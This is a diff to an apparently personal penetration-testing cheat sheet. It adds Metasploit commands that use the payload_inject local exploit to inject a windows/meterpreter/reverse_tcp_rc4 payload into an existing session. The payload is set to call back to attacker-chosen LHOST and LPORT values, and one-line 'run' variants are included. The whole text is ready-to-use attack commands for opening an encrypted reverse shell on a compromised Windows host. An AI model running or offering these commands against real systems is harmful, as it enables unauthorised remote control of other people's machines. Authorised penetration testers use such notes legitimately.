@@ -152,15 +152,29 @@ run AMOUNT=<2>,HANDLER=<true>,SESSION=<1>,IPLIST=<payload_connect_to_ips>,LPORT=
 use exploit/windows/local/payload_inject
 set AUTOUNHOOK <true>
 set SESSION <1>
-# set PAYLOAD <payload>
-# set payload options
+set LHOST <payload_connect_to_ip>
+set LPORT <payload_connect_to_port>
+```
+
+## Options with a custom payload
+```ruby
+use exploit/windows/local/payload_inject
+set AUTOUNHOOK <true>
+set SESSION <1>
+set PAYLOAD windows/meterpreter/reverse_tcp_rc4
+set RC4PASSWORD <random_password> # head -10 /dev/random | sha256sum
 set LHOST <payload_connect_to_ip>
 set LPORT <payload_connect_to_port>
 ```
 
 ## Run
 ```ruby
-run -o AUTOUNHOOK=<true>,SESSION=<1>,<payload_connect_to_ips>,LPORT=<payload_connect_to_port> <ip>
+run -o AUTOUNHOOK=<true>,SESSION=<1>,LHOST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port>
+```
+
+## Run with a custom payload
+```ruby
+run -o AUTOUNHOOK=<true>,SESSION=<1>,LHOST=<payload_connect_to_ips>,LPORT=<payload_connect_to_port>,PAYLOAD='windows/meterpreter/reverse_tcp_rc4',RC4PASSWORD=<random_password>
 ```
 
 # Get system
